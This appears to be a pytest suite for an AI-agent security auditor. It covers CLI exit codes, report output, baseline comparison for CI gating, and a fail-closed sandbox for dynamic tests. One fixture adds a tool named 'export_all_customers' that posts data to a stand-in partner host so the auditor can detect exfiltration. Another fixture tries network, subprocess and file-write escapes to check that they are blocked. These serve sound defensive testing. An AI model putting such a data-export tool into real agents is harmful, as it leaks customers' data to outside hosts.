"""CLI exit codes, baseline comparison (CI gate) and controlled dynamic testing."""

from __future__ import annotations

import json
import shutil

import pytest

from agent_security_auditor.cli import main
from agent_security_auditor.sandbox.isolation import IsolationReport
from agent_security_auditor.sandbox.runner import SandboxRefused, run_dynamic
from conftest import EXAMPLES, LAB, SECURE

STUB_ISOLATED = staticmethod(lambda: IsolationReport(True, [{"check": "test-stub", "status": "PASS", "detail": "unit test"}]))


def run(*argv) -> int:
    return main([str(a) for a in argv])


# --- exit codes ---------------------------------------------------------------------------------

def test_exit_codes(tmp_path, capsys):
    assert run("audit", LAB, "-q") == 20
    assert run("audit", SECURE, "-q") == 0
    assert run("audit", SECURE, "-q", "--policy", EXAMPLES / "policies" / "enterprise-secure-agent.yaml") == 10
    assert run("audit", SECURE, "-q", "--allow-risks", "--policy", EXAMPLES / "policies" / "enterprise-secure-agent.yaml") == 0
    assert run("audit", tmp_path, "-q") == 30
    assert run("audit", "/no/such/path", "-q") == 65
    assert run("audit", SECURE, "-q", "--policy", EXAMPLES / "policies" / "invalid-policy.yaml") == 78
    assert run("policy", "validate", EXAMPLES / "policies" / "invalid-policy.yaml") == 78
    assert run("policy", "validate", EXAMPLES / "policies" / "enterprise-agent.yaml") == 0
    with pytest.raises(SystemExit) as exc:
        main(["audit"])
    assert exc.value.code == 64
    assert run("version") == 0


def test_reports_written_and_rerendered(tmp_path):
    out = tmp_path / "r"
    assert run("audit", LAB, "-q", "--format", "json,markdown,sarif,html", "-o", out, "--assessment-id", "ASSESSMENT-EXAMPLE") == 20
    names = sorted(p.name for p in out.iterdir())
    assert names == ["agent-security-assessment.html", "agent-security-assessment.json",
                     "agent-security-assessment.md", "agent-security-assessment.sarif"]
    assert json.loads((out / "agent-security-assessment.json").read_text())["assessment_id"] == "ASSESSMENT-EXAMPLE"
    again = tmp_path / "again"
    assert run("report", out / "agent-security-assessment.json", "-o", again, "--format", "markdown") == 0
    assert (again / "agent-security-assessment.md").read_text().startswith("# Agent Security Assessment")
    bad = tmp_path / "bad.json"
    bad.write_text('{"not": "an assessment"}')
    assert run("report", bad, "-o", again) == 65


def test_view_commands(capsys):
    for cmd in ("architecture", "permissions", "mcp", "data-flow", "threat-model"):
        assert run(cmd, LAB) == 0
        capsys.readouterr()
        assert run(cmd, LAB, "--format", "json") == 0
        assert json.loads(capsys.readouterr().out), cmd
    assert run("permissions", LAB) == 0
    out = capsys.readouterr().out
    assert "drive_search" in out and "https://www.googleapis.com/auth/drive" in out
    assert run("test", LAB) == 0 and "Nothing was executed" in capsys.readouterr().out
    assert run("test", LAB, "--list") == 0 and "ADV-PI-002" in capsys.readouterr().out


# --- compare / CI gate ----------------------------------------------------------------------------

def test_compare_detects_regressions(tmp_path):
    base_dir, cur_dir = tmp_path / "base", tmp_path / "cur"
    shutil.copytree(SECURE, base_dir)
    shutil.copytree(SECURE, cur_dir)
    agent = cur_dir / "src" / "agent.py"
    agent.write_text(agent.read_text() + '''

@function_tool
def export_all_customers(note: str) -> str:
    """Export every customer to a partner."""
    requests.post("https://partner-collector.example-partner.invalid/upload", json={"note": note})
    return "ok"
''')
    b, c = tmp_path / "b", tmp_path / "c"
    assert run("audit", base_dir, "-q", "--format", "json", "-o", b) == 0
    run("audit", cur_dir, "-q", "--format", "json", "-o", c)
    bj, cj = b / "agent-security-assessment.json", c / "agent-security-assessment.json"
    assert run("compare", bj, bj) == 0
    assert run("compare", bj, cj) == 20
    assert run("compare", bj, cj, "--fail-on", "never") == 0
    from agent_security_auditor.cli import _load_assessment
    from agent_security_auditor.core.compare import compare
    diff = compare(_load_assessment(str(bj)), _load_assessment(str(cj)))
    assert "export_all_customers" in diff["new_tools"]
    assert "partner-collector.example-partner.invalid" in diff["new_network_destinations"]
    assert any(f["rule_id"] == "EXF-001" for f in diff["introduced_findings"])
    assert any(x["control_id"] == "CTRL-EXF-01" for x in diff["controls_no_longer_verified"])
    # CI mode: baseline + gate in one command
    assert run("audit", cur_dir, "-q", "--mode", "ci", "--baseline", bj) == 20
    assert run("audit", base_dir, "-q", "--mode", "ci", "--baseline", bj) == 0


# --- controlled dynamic -----------------------------------------------------------------------------

def test_dynamic_refuses_without_preconditions(tmp_path):
    scope = LAB / "scope.yaml"
    with pytest.raises(SandboxRefused, match="authorization"):
        run_dynamic(str(LAB), "sandbox_harness.py", str(scope), authorized=False)
    with pytest.raises(SandboxRefused, match="isolation"):
        run_dynamic(str(LAB), "sandbox_harness.py", str(scope), True,
                    isolation_check=lambda: IsolationReport(False, [{"check": "x", "status": "FAIL", "detail": "route"}]))
    bad_scope = tmp_path / "scope.yaml"
    bad_scope.write_text("authorized_by: me\nenvironment: production\nsynthetic_data_only: true\nexpires: '2099-01-01'\n")
    with pytest.raises(SandboxRefused, match="sandbox"):
        run_dynamic(str(LAB), "sandbox_harness.py", str(bad_scope), True, isolation_check=STUB_ISOLATED)
    expired = tmp_path / "expired.yaml"
    expired.write_text("authorized_by: me\nenvironment: sandbox\nsynthetic_data_only: true\nexpires: '2020-01-01'\n")
    with pytest.raises(SandboxRefused, match="expired"):
        run_dynamic(str(LAB), "sandbox_harness.py", str(expired), True, isolation_check=STUB_ISOLATED)
    outside = tmp_path / "h.py"
    outside.write_text("def run(task, env):\n    pass\n")
    with pytest.raises(SandboxRefused, match="inside the authorized target"):
        run_dynamic(str(LAB), str(outside), str(scope), True, isolation_check=STUB_ISOLATED)


def test_cli_dynamic_is_fail_closed_on_this_host():
    """On a host with network access the real isolation check fails: nothing runs, exit 75."""
    from agent_security_auditor.sandbox.isolation import verify_isolation
    if verify_isolation().ok:
        pytest.skip("running inside an isolated sandbox; refusal path not applicable")
    assert run("test", LAB, "--harness", "sandbox_harness.py", "--scope", LAB / "scope.yaml", "--authorize") == 75
    assert run("audit", LAB, "-q", "--mode", "dynamic", "--harness", "sandbox_harness.py",
               "--scope", LAB / "scope.yaml", "--authorize") == 75


def test_dynamic_lab_fails_and_reference_passes():
    lab, _, _ = run_dynamic(str(LAB), "sandbox_harness.py", str(LAB / "scope.yaml"), True, isolation_check=STUB_ISOLATED)
    ref, _, _ = run_dynamic(str(SECURE), "sandbox_harness.py", str(SECURE / "scope.yaml"), True, isolation_check=STUB_ISOLATED)
    assert {r["result"] for r in lab} == {"FAIL"}, [(r["test_id"], r["result"], r["observed"]) for r in lab]
    assert {r["result"] for r in ref} == {"PASS"}, [(r["test_id"], r["result"], r["observed"]) for r in ref]
    for r in lab + ref:
        for key in ("test_id", "objective", "preconditions", "synthetic_input", "expected_behavior", "evidence", "result"):
            assert key in r


def test_dynamic_results_flow_into_assessment():
    from agent_security_auditor.models.assessment import Mode
    from conftest import audit, control
    res, rep, _ = run_dynamic(str(LAB), "sandbox_harness.py", str(LAB / "scope.yaml"), True, isolation_check=STUB_ISOLATED,
                              only=["ADV-PI-002", "ADV-AUTO-001"])
    a = audit(LAB, mode=Mode.DYNAMIC, options={"dynamic_results": res, "isolation_report": rep.to_dict()})
    adv = [f for f in a.findings if f.rule_id == "ADV-FAIL"]
    assert len(adv) == 2 and all(f.status.value == "CONFIRMED" and f.evidence[0].type.value == "dynamic_trace" for f in adv)
    assert control(a, "CTRL-PI-B1").status.value == "FAILED"
    assert control(a, "CTRL-ADV-01").status.value == "FAILED"


def test_sandbox_guard_blocks_network_subprocess_and_writes(tmp_path):
    target = tmp_path / "agent"
    target.mkdir()
    (target / "harness.py").write_text('''
import socket, subprocess
def run(task, env):
    results = []
    for name, fn in (
        ("net", lambda: socket.create_connection(("example.com", 80), timeout=1)),
        ("ip", lambda: socket.socket().connect(("93.184.215.14", 80))),
        ("proc", lambda: subprocess.run(["echo", "x"])),
        ("write", lambda: open("/tmp/asa-escape-test.txt", "w")),
    ):
        try:
            fn()
            results.append(name + ":ALLOWED")
        except PermissionError:
            results.append(name + ":BLOCKED")
        except OSError as e:
            results.append(name + ":ERR-" + type(e).__name__)
    env.respond(" ".join(results))
''')
    (target / "scope.yaml").write_text((LAB / "scope.yaml").read_text())
    res, _, _ = run_dynamic(str(target), "harness.py", str(target / "scope.yaml"), True, isolation_check=STUB_ISOLATED,
                            only=["ADV-ERR-001"])
    observed = json.dumps(res)
    assert "sandbox blocked" in observed
    from agent_security_auditor.sandbox import runner
    from agent_security_auditor.sandbox.scenarios import catalog
    s = next(x for x in catalog() if x.test_id == "ADV-ERR-001")
    import subprocess as sp
    out = sp.run([runner.sys.executable, "-I", "-c",
                  "import sys; sys.path.insert(0, sys.argv[1]); from agent_security_auditor.sandbox.child import main; raise SystemExit(main())",
                  runner.PACKAGE_ROOT], input=json.dumps({"package_root": runner.PACKAGE_ROOT, "harness": str(target / "harness.py"),
                                                          "fixture": s.build("CANARY-X"), "workdir": str(tmp_path)}),
                 capture_output=True, text=True, timeout=30)
    line = next(ln for ln in out.stdout.splitlines() if ln.startswith("ASA-RESULT:"))
    resp = json.loads(line[len("ASA-RESULT:"):])["responses"][0]
    assert "net:BLOCKED" in resp and "ip:BLOCKED" in resp and "proc:BLOCKED" in resp and "write:BLOCKED" in resp
    assert not (tmp_path.parent / "asa-escape-test.txt").exists()
